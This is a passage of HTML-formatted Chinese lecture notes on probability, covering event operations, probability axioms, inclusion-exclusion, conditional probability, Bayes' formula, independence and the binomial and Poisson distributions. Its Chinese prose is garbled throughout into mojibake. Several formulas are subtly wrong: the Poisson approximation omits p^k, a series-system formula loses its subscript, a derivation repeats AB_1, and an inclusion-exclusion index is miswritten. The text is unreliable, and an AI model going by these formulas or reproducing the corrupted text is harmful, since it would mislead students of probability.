è‡³å°‘æœ‰ä¸€ä¸ªå‘ç”Ÿ</p><p><mark>ç§¯äº‹ä»¶</mark> $A \cap B$, $A \cdot B$, $AB$ &#x3D;&#x3D;&gt; A ä¸ B åŒæ—¶å‘ç”Ÿ.</p><p><mark>äº’æ–¥</mark> $AB &#x3D; \varnothing$ &#x3D;&#x3D;&gt; A ä¸ B ä¸å¯èƒ½åŒæ—¶å‘ç”Ÿ. (å³ä¸€ä¸ªæ ·æœ¬ç‚¹ä¸å¯èƒ½æ—¢åœ¨ A ä¸­åˆåœ¨ B ä¸­)</p><p><mark>é€†äº‹ä»¶</mark> $\overline{A}$ &#x3D;&#x3D;&gt; A ä¸å‘ç”Ÿ </p><p><mark>äº’é€†</mark><br>$$<br>\displaylines{<br>\begin{cases}<br>A \cup B &#x3D; S \newline~ \newline<br>A B &#x3D; \varnothing<br>\end{cases} }<br>$$<br>åˆ™ A å’Œ B äº’é€†. (å’Œäº’è¡¥ç±»ä¼¼)</p><p><mark>å·®äº‹ä»¶</mark> è‹¥è¡¨ç¤ºäº‹ä»¶ A å¯¹äº‹ä»¶ B çš„å·®äº‹ä»¶ $A \overline{B} &#x3D; A - B$ &#x3D;&#x3D;&gt; A å‘ç”Ÿï¼ŒB ä¸å‘ç”Ÿ</p><h3 id="å¾·æ‘©æ ¹å®šç†"><a href="#å¾·æ‘©æ ¹å®šç†" class="headerlink" title="å¾·æ‘©æ ¹å®šç†"></a>å¾·æ‘©æ ¹å®šç†</h3><p>$$<br>\displaylines{\overline{\bigcap_{i&#x3D;1}^n A_i} &#x3D; \bigcup_{i&#x3D;1}^n \overline{A_i} \newline~ \newline \overline{\bigcup_{i&#x3D;1}^n A_i} &#x3D; \bigcap_{i&#x3D;1}^n \overline{A_i}}<br>$$</p><h3 id="ä¸²è”ç³»ç»Ÿå’Œå¹¶è”ç³»ç»Ÿ"><a href="#ä¸²è”ç³»ç»Ÿå’Œå¹¶è”ç³»ç»Ÿ" class="headerlink" title="ä¸²è”ç³»ç»Ÿå’Œå¹¶è”ç³»ç»Ÿ"></a>ä¸²è”ç³»ç»Ÿå’Œå¹¶è”ç³»ç»Ÿ</h3><p><mark>ä¸²è”ç³»ç»Ÿ</mark> ä¸€ä¸ªæŸåï¼Œç³»ç»Ÿå°±æŸå:<br>$$<br>\displaylines{A &#x3D; \bigcap_{i&#x3D;1}^n A}<br>$$<br>$A_i$ ä¸­æœ‰ä¸€ä¸ªä¸ºç©ºé›†, $A$ å°±æ˜¯ç©ºé›†.</p><p><mark>å¹¶è”ç³»ç»Ÿ</mark> ä¸€ä¸ªæŸåï¼Œç³»ç»Ÿä¸æŸå:<br>$$<br>\displaylines{A &#x3D; \bigcup_{i&#x3D;1}^n A_i}<br>$$<br>$A_i$ ä¸­æœ‰ä¸€ä¸ªä¸ºç©ºé›†, $A$ ä¸ä¸ºæ˜¯ç©ºé›†.</p><h2 id="é¢‘ç‡ä¸æ¦‚ç‡"><a href="#é¢‘ç‡ä¸æ¦‚ç‡" class="headerlink" title="é¢‘ç‡ä¸æ¦‚ç‡"></a>é¢‘ç‡ä¸æ¦‚ç‡</h2><h3 id="é¢‘ç‡"><a href="#é¢‘ç‡" class="headerlink" title="é¢‘ç‡"></a>é¢‘ç‡</h3><p>é¢‘ç‡è®°ä¸º $f_n(A)$:<br>$$<br>\displaylines{f_n(A) &#x3D; \frac{n_A}{n}}<br>$$</p><p>$n$ æ˜¯æ€»è¯•éªŒæ¬¡æ•° (é›†åˆçš„æ€»å…ƒç´ ä¸ªæ•°)</p><p>$n_A$ æ˜¯ $A$ å‘ç”Ÿçš„æ¬¡æ•° (é›†åˆ A ä¸­çš„å…ƒç´ ä¸ªæ•°)</p><p>é¢‘ç‡ $f_n(A)$ åæ˜ äº†äº‹ä»¶ A å‘ç”Ÿçš„é¢‘ç¹ç¨‹åº¦.</p><h3 id="é¢‘ç‡çš„æ€§è´¨"><a href="#é¢‘ç‡çš„æ€§è´¨" class="headerlink" title="é¢‘ç‡çš„æ€§è´¨"></a>é¢‘ç‡çš„æ€§è´¨</h3><ul><li>$0 \le f_n(A) \le 1$</li><li>$f_n(S) &#x3D; 1$</li><li>è‹¥ $A_1, A_2, â€¦, A_k$ ä¸¤ä¸¤äº’ä¸ç›¸å®¹, åˆ™ $f_n(\bigcup_{i&#x3D;1}^k A_i) &#x3D; \sum_{i&#x3D;1}^k f_n(A_i)$ (å³ï¼ŒæŠŠ$A_1, A_2, â€¦, A_k$ ä¸­æ‰€æœ‰å…ƒç´ æ”¾åœ¨ä¸€èµ·çš„é›†åˆçš„é¢‘ç‡ï¼Œç­‰äºæ‰€æœ‰é¢‘ç‡ç›¸åŠ )</li><li>$f_n(A)$ éš $n$ çš„å¢å¤§æ¸è¶‹ç¨³å®šï¼Œè®°ç¨³å®šå€¼ä¸º $p$ (å¦‚æ‰”ç¡¬å¸ï¼Œæ‰”çš„æ¬¡æ•°è¶Šå¤šï¼Œæœ€åç»“æœä¸ºæ­£é¢çš„å¯èƒ½æ€§æ‰ä¼šæ¥è¿‘ 50%)</li></ul><h3 id="æ¦‚ç‡"><a href="#æ¦‚ç‡" class="headerlink" title="æ¦‚ç‡"></a>æ¦‚ç‡</h3><blockquote><p>å®šä¹‰</p></blockquote><p>å¯¹æ ·æœ¬ç©ºé—´ S ä¸­ä»»ä¸€äº‹ä»¶ A, å®šä¹‰ä¸€ä¸ªå®æ•° $P(A)$, æ»¡è¶³:</p><ul><li>éè´Ÿæ€§: $P(A) \ge 0$</li><li>è§„èŒƒæ€§: $P(S) &#x3D; 1$</li><li>å¯åˆ—å¯åŠ æ€§: è‹¥ $A_1, A_2, â€¦, A_k, â€¦$, ä¸¤ä¸¤ä¸ç›¸å®¹ï¼Œåˆ™ $P(\bigcup_{i&#x3D;1}^\infty A_i) &#x3D; \sum_{i&#x3D;1}^\infty P(A_i)$ (å³æ‰€æœ‰é›†åˆå†…çš„å…ƒç´ ç›¸åŠ å¾—åˆ°çš„é›†åˆçš„æ¦‚ç‡ï¼Œç­‰äºæ‰€æœ‰é›†åˆæ¦‚ç‡çš„å’Œ)</li></ul><p>ç§° $P(A)$ ä¸ºäº‹ä»¶ A çš„æ¦‚ç‡.</p><h3 id="æ¦‚ç‡çš„æ€§è´¨"><a href="#æ¦‚ç‡çš„æ€§è´¨" class="headerlink" title="æ¦‚ç‡çš„æ€§è´¨"></a>æ¦‚ç‡çš„æ€§è´¨</h3><ul><li>$P(\varnothing) &#x3D; 0$</li><li>$A_1, A_2, â€¦, A_n$, $A_iA_j &#x3D; \varnothing$ (è¯´æ˜äº’æ–¥) $\Rightarrow P(\bigcup_{i&#x3D;1}^\infty A_i) &#x3D; \sum_{i&#x3D;1}^\infty P(A_i)$ </li><li>$P(A) &#x3D; 1 - P(\overline{A})$</li><li>$A \subset B \Rightarrow P(B - A) &#x3D; P(B) - P(A) \Rightarrow P(B) \ge P(A)$ </li><li><mark>åŠ æ³•å…¬å¼</mark> : $P(A \cup B) &#x3D; P(A) + P(B) - P(AB)$</li></ul><p>ä¸€èˆ¬æƒ…å†µä¸‹:</p><ul><li>$P(B - A) &#x3D; P(B) - P(BA)$ (ä¹Ÿå°±æ˜¯ä» B çš„é›†åˆä¸­ï¼Œæ’é™¤å’Œ A å…±æœ‰çš„éƒ¨åˆ†, å°±æ˜¯ B ç‹¬æœ‰çš„éƒ¨åˆ†)</li><li>$P(C - B - A) &#x3D; P(C) - P(CA \cup CB)$</li></ul><p>å¯ä»¥çœ‹å‡ºæ¥è§„å¾‹.</p><blockquote><p>åŠ æ³•å…¬å¼æ¨å¯¼</p></blockquote><p>$$<br>\displaylines{\because A \bigcup B &#x3D; A \bigcup (B - A) \newline~ \newline<br>\Rightarrow P(A \cup B) &#x3D; P(A \cup (B-A)) &#x3D; P(A) + P(B-A) \newline~ \newline<br>&#x3D; P(A) + P(B) - P(AB) }<br>$$</p><blockquote><p>åŠ æ³•å…¬å¼çš„æ¨å¹¿ 1<br>$$<br>\displaylines{P(A \cup B \cup C) &#x3D; P(A) + P(B) + P(C) - P(AB) - P(AC) - P(BC) + P(ABC)}<br>$$</p></blockquote><p>æ¨å¯¼å¦‚ä¸‹:<br>$$<br>\displaylines{P(A \cup B \cup C) \newline~ \newline<br>&#x3D; P(A \cup B \cup (C - A - B)) \newline~ \newline<br>&#x3D; P(A \cup B) + P(C) - P(AC \cup BC) \newline~ \newline<br>P(A) + P(B) - P(AB) + P(C) - P(AC) -P(BC) + P(ABC)}<br>$$</p><blockquote><p>åŠ æ³•å…¬å¼çš„æ¨å¹¿ 2</p></blockquote><p>$$<br>\displaylines{P(\bigcup_{i&#x3D;1}^n A_i) &#x3D; \sum_{i &#x3D; 1}^n P(A_i) - \sum_{1 \le i &lt; j \le n} P(A_i A_j) + \sum_{1 \le i &lt; j \le k \le n} P(A_i A_j A_k) - â€¦ + (-1)^{n-1}P(A_1A_2 â€¦ A_n)}<br>$$</p><p>å¥‡æ•°ç›¸åŠ ï¼Œå¶æ•°ç›¸å‡, å¥‡æ•°æŒ‡ $P(A) + P(B) â€¦$ æˆ– $P(A_1A_2A_3) + P(A_4A_5A_6)$</p><h2 id="å¤å…¸æ¦‚å‹-ç­‰å¯èƒ½æ¦‚å‹"><a href="#å¤å…¸æ¦‚å‹-ç­‰å¯èƒ½æ¦‚å‹" class="headerlink" title="å¤å…¸æ¦‚å‹ (ç­‰å¯èƒ½æ¦‚å‹)"></a>å¤å…¸æ¦‚å‹ (ç­‰å¯èƒ½æ¦‚å‹)</h2><blockquote><p>å®šä¹‰</p></blockquote><p>è¯•éªŒ E æ»¡è¶³:</p><ul><li>S ä¸­æ ·æœ¬ç‚¹æœ‰é™ <mark>(æœ‰é™æ€§)</mark> </li><li>å‡ºç°æ¯ä¸€ä¸ªæ ·æœ¬ç‚¹çš„æ¦‚ç‡ç›¸ç­‰ <mark>(ç­‰å¯èƒ½æ€§)</mark> å¦‚ï¼Œ1ä¸ªè¢‹å­ä¸­5ä¸ªç™½çƒå’Œ5ä¸ªé»‘çƒï¼Œå…¶ä¸­ï¼Œæ¯ä¸€ä¸ªæ ·æœ¬ç‚¹å°±æ˜¯æŒ‡çƒï¼Œè€Œä¸ç‰¹æ˜¯ç™½çƒæˆ–é»‘çƒ</li></ul><p>è¿™æ—¶, <mark>å¤å…¸æ¦‚å‹æ¦‚ç‡è®¡ç®—å…¬å¼</mark> :<br>$$<br>\displaylines{P(A) &#x3D; \frac{A æ‰€åŒ…å«çš„æ ·æœ¬ç‚¹æ•°}{S ä¸­çš„æ ·æœ¬ç‚¹æ•°}}<br>$$</p><p><mark>æ’åˆ—å’Œç»„åˆå…¬å¼</mark> </p><ul><li>æ’åˆ—, æœ‰é¡ºåº: $A_n^k &#x3D; \frac{n!}{(n - k)!}$, å¦‚ $A_5^2 &#x3D; \frac{5!}{3!} &#x3D; 5 \times 4$</li><li>ç»„åˆï¼Œæ— é¡ºåº: $C_n^k &#x3D; \frac{n!}{(n-k)!(k)!}$, å¦‚ $C_5^2 &#x3D; \frac{5!}{2!3!} &#x3D; \frac{5 \times 4}{2 \times 1}$</li></ul><p><mark>å®é™…æ¨æ–­åŸç†</mark> </p><p>äººä»¬åœ¨æ’‘èµ·çš„å®è·µä¸­æ€»ç»“å¾—åˆ°: â€œæ¦‚ç‡å¾ˆå°çš„äº‹ä»¶åœ¨ä¸€æ¬¡è¯•éªŒä¸­å®é™…ä¸Šå‡ ä¹æ˜¯ä¸å¯èƒ½å‘ç”Ÿçš„â€</p><h2 id="æ¡ä»¶æ¦‚ç‡"><a href="#æ¡ä»¶æ¦‚ç‡" class="headerlink" title="æ¡ä»¶æ¦‚ç‡"></a>æ¡ä»¶æ¦‚ç‡</h2><p>ä¸€ä¸ªäº‹ä»¶å·²ç»å‘ç”Ÿæ—¶ï¼Œå¦ä¸€ä¸ªäº‹ä»¶å‘ç”Ÿçš„æ¦‚ç‡ï¼Œ</p><blockquote><p>å®šä¹‰:</p></blockquote><p>$$<br>\displaylines{P(B|A) &#x3D; \frac{P(BA)}{P(A)}\ \ \ P(A) \ne 0}<br>$$<br>( <mark>è®°å¿†æ–¹æ³•</mark>, å»æ‰ â€œ|â€, å†™åœ¨ä¸Šé¢ï¼Œå³ä¾§çš„å†™åœ¨ä¸‹é¢ )</p><p>è¡¨ç¤º A å‘ç”Ÿçš„æ¡ä»¶ä¸‹ï¼ŒB å‘ç”Ÿçš„æ¡ä»¶æ¦‚ç‡. (å› ä¸ºæœ‰ä¸€ä¸ªå·²çŸ¥çš„é™å®šæ¡ä»¶ï¼Œæ‰€ä»¥å«åšæ¡ä»¶æ¦‚ç‡, æ¡ä»¶å†™åœ¨å³è¾¹)</p><p>æ»¡è¶³ä¸‰æ¡å…¬ç†:</p><ul><li>éè´Ÿæ€§: $P(B|A) \ge 0$</li><li>è§„èŒƒæ€§: $P(S|A) &#x3D; 1$</li><li>å¯åˆ—å¯åŠ æ€§: $A_1, A_2, â€¦, A_k, â€¦$, ä¸¤ä¸¤äº’æ–¥ $\Rightarrow P(\bigcup_{i&#x3D;1}^\infty A_i | A) &#x3D; \sum_{i&#x3D;1}^\infty P(A_i | A)$</li></ul><p>P(B|A) å…·æœ‰æ¦‚ç‡çš„æ‰€æœ‰æ€§è´¨ï¼Œå¦‚ <mark>åŠ æ³•å…¬å¼</mark> </p><h3 id="æ¡ä»¶æ¦‚ç‡çš„ä¹˜æ³•å…¬å¼"><a href="#æ¡ä»¶æ¦‚ç‡çš„ä¹˜æ³•å…¬å¼" class="headerlink" title="æ¡ä»¶æ¦‚ç‡çš„ä¹˜æ³•å…¬å¼"></a>æ¡ä»¶æ¦‚ç‡çš„ä¹˜æ³•å…¬å¼</h3><p>$$<br>\displaylines{P(AB) &#x3D; P(A|B) \cdot P(B) &#x3D; P(B|A) \cdot P(A) \newline~ \newline<br>P(ABC) &#x3D; P(A|BC) \cdot P(BC) &#x3D; P(A|BC) \cdot P(B|C) \cdot P(C)} \newline~ \newline<br>P(A_1A_2â€¦A_n) &#x3D; P(A_1)P(A_2|A_1)P(A_3|A_1A_2)â€¦P(A_n|A_1â€¦A_{n-1})<br>$$</p><p>ä¹Ÿå°±æ˜¯ï¼Œæ‰€æœ‰äº¤é›†å½¢å¼çš„æ¦‚ç‡éƒ½å¯ä»¥è½¬åŒ–ä¸ºæ¡ä»¶æ¦‚ç‡.</p><h2 id="å…¨æ¦‚ç‡å…¬å¼ä¸-Bayes"><a href="#å…¨æ¦‚ç‡å…¬å¼ä¸-Bayes" class="headerlink" title="å…¨æ¦‚ç‡å…¬å¼ä¸ Bayes"></a>å…¨æ¦‚ç‡å…¬å¼ä¸ Bayes</h2><blockquote><p>å®šä¹‰</p></blockquote><p>$B_1, B_2, â€¦, B_n$ ä¸º S çš„ä¸€ä¸ªåˆ’åˆ†ï¼Œè‹¥:</p><ul><li>$B_1 \cup B_2 \cup â€¦ \cup B_n &#x3D; S$</li><li>$B_i B_j &#x3D; \varnothing,\ i \ne j$</li></ul><p>åˆ™è¿™äº›æ¦‚ç‡ç›¸åŠ åˆ™ä¸ºä¸€ä¸ªäº‹ä»¶çš„å…¨éƒ¨æ¦‚ç‡.</p><p><mark>å…¨æ¦‚ç‡å…¬å¼</mark> ä¸º:<br>$$<br>\displaylines{P(A) &#x3D; \sum_{j&#x3D;1}^n P(A|B_j) \cdot P(B_j)  }<br>$$<br>å…¶ä¸­ $\sum_{j&#x3D;1}^n P(A|B_j) \cdot P(B_j)$ ä¹Ÿå°±æ˜¯ $\sum_{j&#x3D;1}^n P(AB_j)$</p><p><img src="/../img/total_probability_formula.png"></p><blockquote><p>æ¨å¯¼</p></blockquote><p>$$<br>\displaylines{\because A &#x3D; AS &#x3D; AB_1 \cup AB_1 \cup â€¦ \cup AB_n \newline~ \newline<br>\therefore P(A) &#x3D; \sum_{j&#x3D;1}^n P(AB_j) \newline~ \newline<br>&#x3D; \sum_{j&#x3D;1}^n P(A|B_j) \cdot P(B_j)}<br>$$</p><p><mark>åº”ç”¨å…¨æ¦‚ç‡å…¬å¼çš„å…³é”®</mark> </p><p>æ‰¾åˆ°åˆé€‚çš„åˆ’åˆ†.</p><h3 id="Bayes-å…¬å¼"><a href="#Bayes-å…¬å¼" class="headerlink" title="Bayes å…¬å¼"></a>Bayes å…¬å¼</h3><p>å€ŸåŠ©å…¨æ¦‚ç‡å…¬å¼ï¼Œç”¨äºè®¡ç®—æ¡ä»¶æ¦‚ç‡:<br>$$<br>\displaylines{P(B_i|A) &#x3D; \frac{P(B_i A)}{P(A)}}<br>$$</p><p>å°†åˆ†å­æ‹†å¼€, å¯¹åˆ†æ¯åº”ç”¨å…¨æ¦‚ç‡å…¬å¼:<br>$$<br>\displaylines{P(B_i|A) &#x3D; \frac{P(A|B_i) P(B_i)}{\sum_{j&#x3D;1}^n P(A|B_j) P(B_j)}}<br>$$</p><h2 id="äº‹ä»¶ç‹¬ç«‹æ€§ä¸ç‹¬ç«‹è¯•éªŒ"><a href="#äº‹ä»¶ç‹¬ç«‹æ€§ä¸ç‹¬ç«‹è¯•éªŒ" class="headerlink" title="äº‹ä»¶ç‹¬ç«‹æ€§ä¸ç‹¬ç«‹è¯•éªŒ"></a>äº‹ä»¶ç‹¬ç«‹æ€§ä¸ç‹¬ç«‹è¯•éªŒ</h2><blockquote><p>å®šä¹‰</p></blockquote><p>è®¾ A, B ä¸ºä¸¤éšæœºäº‹ä»¶ï¼Œå¦‚æœ $P(AB) &#x3D; P(A) P(B)$, åˆ™ç§° <mark>A ä¸ B ç›¸äº’ç‹¬ç«‹</mark> </p><p>è‹¥ $P(A) \ne 0, P(B) \ne 0$, å¯ä»¥å¾—åˆ°:<br>$$<br>\displaylines{P(AB) &#x3D; P(A)P(B) &#x3D; P(A|B)P(B) \newline~ \newline<br>P(A) &#x3D; P(A|B) \newline~ \newline<br>or \newline~ \newline<br>P(AB) &#x3D; P(A)P(B) &#x3D; P(B|A)P(A) \newline~ \newline<br>P(B) &#x3D; P(B|A)<br>}<br>$$</p><p>ä»è¿™é‡Œä¹Ÿå¯ä»¥çœ‹å‡ºç‹¬ç«‹äºŒå­—ï¼Œå½“ $B$ äº‹ä»¶å‘ç”Ÿæ—¶, $A$ äº‹ä»¶çš„å‘ç”Ÿæ²¡æœ‰å—åˆ°å½±å“.</p><blockquote><p>æ¨è®º</p></blockquote><p>$A, B$ ç›¸äº’ç‹¬ç«‹ $\Leftrightarrow \ \overline{A}, B$ ç›¸äº’ç‹¬ç«‹ $\Leftrightarrow \ A, \overline{B}$ ç›¸äº’ç‹¬ç«‹ $\Leftrightarrow \ \overline{A}, \overline{B}$ ç›¸äº’ç‹¬ç«‹</p><p>$$<br>\displaylines{\because P(AB) &#x3D; P(A)P(B) \newline~ \newline<br>A \overline{B} &#x3D; A - B \newline~ \newline<br>P(A \overline{B}) &#x3D; P(A - B) &#x3D; P(A) - P(AB) \newline~ \newline<br>&#x3D; P(A) - P(A)P(B) \newline~ \newline<br>&#x3D; P(A)[ 1-P(B) ] \newline~ \newline<br>&#x3D; P(A)P(\overline{B})<br>}<br>$$</p><blockquote><p>æ¨å¹¿</p></blockquote><p>è®¾ $A_1, A_2, â€¦, A_n$ ä¸º n ä¸ªéšæœºäº‹ä»¶ï¼Œè‹¥å¯¹ $2 \le k \le n$, å‡æœ‰:<br>$$<br>\displaylines{P(A_{i_1} A_{i_2} â€¦ A_{i_k} &#x3D; \prod_{j&#x3D;1}^k P(A_{i_j}))}<br>$$</p><p>(è¿™é‡Œçš„å¦‚ $A_i$ è¡¨ç¤ºä¸€ä¸ªäº‹ä»¶ï¼Œå¦ä¸€ä¸ªä¸‹æ ‡ 1, 2, â€¦, k è¡¨ç¤ºçš„æ˜¯äº‹ä»¶é‡å¤çš„æ¬¡æ•°, è¿™é‡Œçš„æ„æ€æ˜¯æ¯ä¸€æ¬¡é‡å¤å®éªŒéƒ½ç‹¬ç«‹) </p><p>åˆ™ç§° $A_1, A_2, â€¦, A_n$ ç›¸äº’ç‹¬ç«‹ã€‚</p><p><mark>ç‹¬ç«‹è¯•éªŒ</mark> æŒ‡ä»»ä¸€æ¬¡å­è¯•éªŒçš„ç»“æœéƒ½ä¸å½±å“å…¶ä»–å„å­è¯•éªŒå‡ºç°çš„ç»“æœ.</p><p><mark>é‡å¤è¯•éªŒ</mark> æŒ‡å„å­è¯•éªŒæ˜¯åœ¨ç›¸åŒæ¡ä»¶ä¸‹è¿›è¡Œçš„.</p><h1 id="ç¬¬äºŒç« -éšæœºå˜é‡åŠå…¶åˆ†å¸ƒ"><a href="#ç¬¬äºŒç« -éšæœºå˜é‡åŠå…¶åˆ†å¸ƒ" class="headerlink" title="ç¬¬äºŒç«  éšæœºå˜é‡åŠå…¶åˆ†å¸ƒ"></a>ç¬¬äºŒç«  éšæœºå˜é‡åŠå…¶åˆ†å¸ƒ</h1><h2 id="éšæœºå˜é‡"><a href="#éšæœºå˜é‡" class="headerlink" title="éšæœºå˜é‡"></a>éšæœºå˜é‡</h2><blockquote><p>å®šä¹‰</p></blockquote><p>è®¾éšæœºè¯•éªŒçš„æ ·æœ¬ç©ºé—´ä¸º $S &#x3D; {e}$, è‹¥ $X &#x3D; X(e)$ ä¸ºå®šä¹‰åœ¨æ ·æœ¬ç©ºé—´ $S$ ä¸Šçš„å®å€¼å•æŒ‡å‡½æ•°ï¼Œåˆ™ç§° $X &#x3D; X(e)$ ä¸ºéšæœºå˜é‡.</p><p>$X &#x3D; X(e)$ å¯ä»¥ç†è§£ä¸ºï¼Œ$X$ çš„å€¼ç­‰äº $e$ çš„å‡½æ•°.</p><blockquote><p>ç‰¹ç‚¹</p></blockquote><ul><li>ä¸€èˆ¬é‡‡ç”¨å¤§å†™è‹±æ–‡å­—æ¯ $X, Y, Z$ æ¥è¡¨ç¤ºéšæœºå˜é‡</li><li>å¼•å…¥éšæœºå˜é‡çš„ç›®çš„æ˜¯ç”¨æ¥æè¿°éšæœºç°è±¡</li></ul><p>å¸¸è§çš„ä¸¤ç±»éšæœºå˜é‡:</p><ul><li>ç¦»æ•£å‹çš„</li><li>è¿ç»­å‹çš„</li></ul><h2 id="ç¦»æ•£å‹éšæœºå˜é‡åŠå…¶åˆ†å¸ƒ"><a href="#ç¦»æ•£å‹éšæœºå˜é‡åŠå…¶åˆ†å¸ƒ" class="headerlink" title="ç¦»æ•£å‹éšæœºå˜é‡åŠå…¶åˆ†å¸ƒ"></a>ç¦»æ•£å‹éšæœºå˜é‡åŠå…¶åˆ†å¸ƒ</h2><blockquote><p>å®šä¹‰</p></blockquote><p>å–å€¼è‡³å¤šå¯æ•°çš„éšæœºå˜é‡ä¸º <mark>ç¦»æ•£å‹çš„éšæœºå˜é‡</mark>. </p><p>ä»¥ä¸‹è¡¨æ˜ç¦»æ•£å’Œéç¦»æ•£çš„ç¤ºæ„:<br><img src="/../img/diffence_between_discrete_and_non-discrete_value.jpg"></p><p><mark>æ¦‚ç‡åˆ†å¸ƒå¾‹</mark> ä¸º:</p><p><img src="/../img/probability_distribution_rate.png"></p><p>( $p_i \ge 0, \sum_{i&#x3D;1}^\infty p_i &#x3D; 1$)</p><p>ä¹Ÿå°±æ˜¯ç”¨æ¥æè¿°éšæœºå˜é‡å’Œå…¶æ¦‚ç‡.</p><p>$$<br>\displaylines{<br>æ¦‚ç‡åˆ†å¸ƒå¾‹<br>\begin{cases}<br>å†™å‡ºæ‰€æœ‰å¯èƒ½å–å€¼ \newline~ \newline<br>å†™å‡ºæ¯ä¸ªå–å€¼ç›¸åº”çš„æ¦‚ç‡<br>\end{cases} }<br>$$</p><h3 id="å‡ ä¸ªé‡è¦çš„ç¦»æ•£å‹éšæœºå˜é‡åˆ†å¸ƒ"><a href="#å‡ ä¸ªé‡è¦çš„ç¦»æ•£å‹éšæœºå˜é‡åˆ†å¸ƒ" class="headerlink" title="å‡ ä¸ªé‡è¦çš„ç¦»æ•£å‹éšæœºå˜é‡åˆ†å¸ƒ"></a>å‡ ä¸ªé‡è¦çš„ç¦»æ•£å‹éšæœºå˜é‡åˆ†å¸ƒ</h3><h4 id="0-1-åˆ†å¸ƒ"><a href="#0-1-åˆ†å¸ƒ" class="headerlink" title="0-1 åˆ†å¸ƒ"></a>0-1 åˆ†å¸ƒ</h4><p>$X$ çš„åˆ†å¸ƒå¾‹ä¸º:</p><p><img src="/../img/zero_one_distribution.png"></p><p>ç§°ä¸º <mark>$X$ æœä»å‚æ•°ä¸º p çš„ 0-1 åˆ†å¸ƒ</mark> æˆ–äº®ç‚¹åˆ†å¸ƒ.</p><p>è®°ä¸º $X \sim 0-1(p)$ æˆ– $B(1,p)$</p><p>(è®°å¿†æ–¹æ³•ï¼Œ $p$ æ€»æ˜¯åœ¨æœ€åä¸€ä½, è¿™é‡Œçš„ $B$ å¯èƒ½ä¸º Binomial)</p><p>è¿˜å¯å†™ä¸º:<br>$$<br>\displaylines{P(X&#x3D;k) &#x3D; p^k(1-p)^{1-k},\ \ k &#x3D; 0,1}<br>$$</p><p>åªæœ‰ä¸¤ä¸ªå¯èƒ½ç»“æœçš„è¯•éªŒï¼Œç§°ä¸º <mark>è´åŠªåˆ©è¯•éªŒ</mark> </p><h4 id="äºŒé¡¹åˆ†å¸ƒ"><a href="#äºŒé¡¹åˆ†å¸ƒ" class="headerlink" title="äºŒé¡¹åˆ†å¸ƒ"></a>äºŒé¡¹åˆ†å¸ƒ</h4><p><mark>n é‡è´åŠªåˆ©è¯•éªŒ</mark>: è®¾è¯•éªŒ E åªæœ‰ä¸¤ä¸ªå¯èƒ½çš„ç»“æœ $A ä¸ \overline{A}\ \ , P(A) &#x3D; p, 0 &lt; p &lt; 1$, å°† E ç‹¬ç«‹åœ°é‡å¤è¿›è¡Œ n æ¬¡ï¼Œåˆ™ç§°è¿™ä¸€ä¸²é‡å¤çš„ç‹¬ç«‹è¯•éªŒä¸º n é‡è´åŠªåˆ©è¯•éªŒ. </p><p>(ç‹¬ç«‹ï¼Œä¿è¯æ¯æ¬¡è¯•éªŒç»“æœä¸äº’ç›¸å½±å“. é‡å¤ï¼Œä¿è¯åœ¨ç›¸åŒçš„æ¡ä»¶ä¸‹é‡å¤è¿›è¡Œ)</p><p>è®¾ A åœ¨ n é‡è´åŠªåˆ©è¯•éªŒä¸­å‘ç”Ÿ X æ¬¡ï¼Œåˆ™ $P(X&#x3D;k) &#x3D; C_n^k p^k (1-p)^{n-k},\ \ \ k &#x3D; 0,1,â€¦$ å¹¶ç§° X æœä»å‚æ•° $n,p$ çš„äºŒé¡¹åˆ†å¸ƒ.</p><p>è®°ä¸º:<br>$$<br>\displaylines{X \sim B(n, p)}<br>$$</p><p><mark>æ³¨:</mark> </p><p>$$<br>\displaylines{1 &#x3D; (p + q)^n &#x3D; \sum_{k&#x3D;0}^n C_n^k p^k q^{n-k},\ \ \ å…¶ä¸­\ \ q &#x3D; 1-p}<br>$$</p><h4 id="æ³Šæ¾åˆ†å¸ƒ-Poisson-åˆ†å¸ƒ"><a href="#æ³Šæ¾åˆ†å¸ƒ-Poisson-åˆ†å¸ƒ" class="headerlink" title="æ³Šæ¾åˆ†å¸ƒ (Poisson åˆ†å¸ƒ)"></a>æ³Šæ¾åˆ†å¸ƒ (Poisson åˆ†å¸ƒ)</h4><p>æ³Šæ¾åˆ†å¸ƒä½¿ä¸€äº›äºŒé¡¹åˆ†å¸ƒæ›´æ˜“è®¡ç®—.</p><p>è‹¥éšæœºå˜é‡ X çš„æ¦‚ç‡åˆ†å¸ƒå¾‹ä¸º:<br>$$<br>\displaylines{P(X&#x3D;k) &#x3D; \frac{\lambda^k e^{- \lambda}}{k!},\ \ \  k&#x3D;0,1,2,â€¦,\ \ \lambda &gt; 0}<br>$$<br>åˆ™ç§° X æœä»å‚æ•°ä¸º $\lambda$ çš„æ³Šæ¾åˆ†å¸ƒ.</p><p>è®°ä¸º:<br>$$<br>\displaylines{X \sim P(\lambda)}<br>$$</p><p>(P æ˜¯ Poisson çš„ç®€å†™)</p><p><mark>æ³Šæ¾å®šç†</mark> </p><p>äºŒé¡¹åˆ†å¸ƒä¸æ³Šæ¾åˆ†å¸ƒæœ‰ä¸‹é¢çš„è¿‘ä¼¼ç»“æœ:</p><p>å½“ $n &gt; 10, p &lt; 0.1$ æ—¶ï¼Œ<br>$$<br>\displaylines{C_n^k(1-p)^{n-k} \approx \frac{e^{-\lambda} \lambda^k}{k!}, \ \ \lambda &#x3D; np}<br>$$</p><blockquote><p>æ¨å¯¼</p></blockquote><p>$$<br>\displaylines{\because \lambda &#x3D; np \newline~ \newline<br>C_n^k(1-p)^{n-k} &#x3D; \frac{n!}{k!(n-k)!}P^k(1-p)^{n-k} \newline~ \newline<br>&#x3D; \frac{n!}{k!(n-k)!}( \frac{\lambda}{n})^k ( 1 - \frac{\lambda}{n} )^{n-k} \newline~ \newline<br>&#x3D; \frac{\lambda^k}{k!} \frac{n (n-1)â€¦(n-k+1)}{n^k} \frac{[ (1 - \frac{\lambda}{n})^{ -\frac{n}{\lambda} } ]^{- \lambda}}{ (1 - \frac{\lambda}{n}  )^k } \newline~ \newline<br>å½“ n å……åˆ†å¤§å’Œé€‚å½“çš„ \lambda æ—¶ \newline~ \newline<br>\frac{n (n-1)â€¦(n-k+1)}{n^k} \approx 1, ( 1- \frac{\lambda}{n} )^k \approx 1, [ (1 - \frac{\lambda}{n})^{ -\frac{n}{\lambda} } ] \approx e^{-\lambda} \newline~ \newline<br>å› æ­¤ \newline~ \newline<br>C_n^k(1-p)^{n-k} \approx \frac{e^{-\lambda} \lambda^k}{k!}}<br>$$</p><h4 id="è¶…å‡ ä½•åˆ†å¸ƒ"><a href="#è¶…å‡ ä½•åˆ†å¸ƒ" class="headerlink" 